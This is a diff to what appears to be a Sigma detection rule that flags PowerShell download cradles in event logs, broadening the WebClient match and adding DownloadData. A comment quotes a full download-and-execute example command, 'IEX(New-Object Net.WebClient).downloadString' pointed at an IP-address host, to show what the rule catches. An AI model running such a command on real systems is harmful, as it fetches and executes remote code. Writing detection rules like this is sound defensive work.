@@ -16,10 +16,11 @@ logsource:
 detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
   selection_powershell_native:
     EventID: 800
-    EventData|contains: 'Net.WebClient'
+    EventData|contains: 'WebClient'
     EventData|contains:
       - ".DownloadString("
       - ".DownloadFile("
+      - ".DownloadData("
     EventData|contains: 
       - 'http://'
       - 'https://'
@@ -27,10 +28,11 @@ detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http:/
 
   selection_powershell_modern:
     EventID: 4103
-    Payload|contains: 'Net.WebClient'
+    Payload|contains: 'WebClient'
     Payload|contains:
       - ".DownloadString("
       - ".DownloadFile("
+      - ".DownloadData("
     Payload|contains: 
       - 'http://'
       - 'https://'
@@ -38,10 +40,11 @@ detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http:/
 
   selection_powershell_block:
     EventID: 4104
-    ScriptBlockText|contains: 'Net.WebClient'
+    ScriptBlockText|contains: 'WebClient'
     ScriptBlockText|contains:
       - ".DownloadString("
       - ".DownloadFile("
+      - ".DownloadData("
     ScriptBlockText|contains: 
       - 'http://'
       - 'https://'
